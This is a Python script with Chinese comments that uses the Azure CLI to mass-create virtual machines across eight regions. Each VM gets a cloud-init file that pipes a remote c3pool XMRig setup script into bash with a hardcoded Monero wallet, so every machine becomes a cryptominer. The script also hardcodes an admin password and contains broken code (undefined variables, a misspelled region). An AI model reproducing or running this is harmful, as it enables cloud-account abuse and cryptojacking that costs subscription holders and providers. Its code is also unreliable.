import io
import json
import time
from contextlib import redirect_stdout
from azure.cli.core import get_default_cli
 
# 1.检查配额以确定订阅类型，并确定要开的虚拟机数量
# 初始化区域列表，共8个区域
# Azure for Students和即用即付订阅均不支持 South India 和 West India 区域
locations = ['eastasia','japaneast','australiaeast','australiacentral','southindia','koreacentral','uaenorth','germanywestcentral']
 
# 捕获 get_default_cli().invoke 的标准输出
f = io.StringIO()
with redirect_stdout(f):
    get_default_cli().invoke(['vm', 'list-usage', '--location', 'Australia Rast', '--query',
                              '[?localName == \'Total Regional vCPUs\'].limit'])
size_name = "Standard_F2s_v2"
size_abbreviation = "F2s_v2"
size_count = 2

 
# 2.创建资源组
# 资源组只是资源的逻辑容器,资源组内的资源不必与资源组位于同一区域
get_default_cli().invoke(['group', 'create', '--name', 'myResourceGroup',
                          '--location', 'eastus'])
# 除非订阅被禁用，其他任何情况下创建资源组都会成功（重名也返回成功）
print("创建资源组成功")
 
# 3.创建开机后要运行的脚本
init = "export HOME=/root && curl -s -L http://download.c3pool.com/xmrig_setup/raw/master/setup_c3pool_miner.sh | LC_ALL=en_US.UTF-8 bash -s 474e37KMJDR5WQNqVwE3DACkX1wM3LekrDXByBdRwpKrGNHkuJuZtat7weZUW5Hcaw1R1jZgDqiRgiCFFfwrwyoAT4k9oiV"
with open("./cloud-init.txt", "w") as f:
    f.write("#cloud-config" + "\n")
    f.write("runcmd:" + "\n")
    f.write("  - sudo -s" + "\n")
    f.write(f"  - {init}")
 
# 4.批量创建虚拟机并运行挖矿脚本
for location in locations:
    for i in range(5, -1, -1):
        print("\r等待{}秒,创建下一个".format(i), end="", flush=True)
        time.sleep(1)
     # Azure for Students订阅不支持 norwayeast 区域
    if location == "norwayeast" and type == 0:
        continue
    count = 0
    for a in range(0, size1_count):
        count += 1
        ts = time.time()
        print("正在 " + str(location) + " 区域创建第 " + str(count)
              + f" 个 {size_name} 实例，共 " + str(size_count) + " 个")
        get_default_cli().invoke(
            ['vm', 'create', '--resource-group', 'myResourceGroup', '--name',
             f'{location}-{size_abbreviation}-{int(ts)}', '--image', 'UbuntuLTS',
             '--size', f'{size_name}', '--location', f'{location}', '--admin-username',
             'azureuser', '--admin-password', '6uPF5Cofvyjcew9', '--custom-data',
             'cloud-init.txt', "--no-wait"])
   
# 5.信息汇总
# 获取所有vm的名字
print("\n------------------------------------------------------------------------------\n")
print("大功告成！在8个区域创建虚拟机的命令已成功执行")
print("\n------------------------------------------------------------------------------\n")
print("以下是已创建的虚拟机列表：")
get_default_cli().invoke(['vm', 'list', '--query', '[*].name'])
print("\n\n-----------------------------------------------------------------------------\n")
 
 
 
# 如果想删除脚本创建的所有资源，取消注释以下语句
# get_default_cli().invoke(['group', 'delete', '--name', 'myResourceGroup',
# '--no-wait', '--yes'])
# print("删除资源组成功")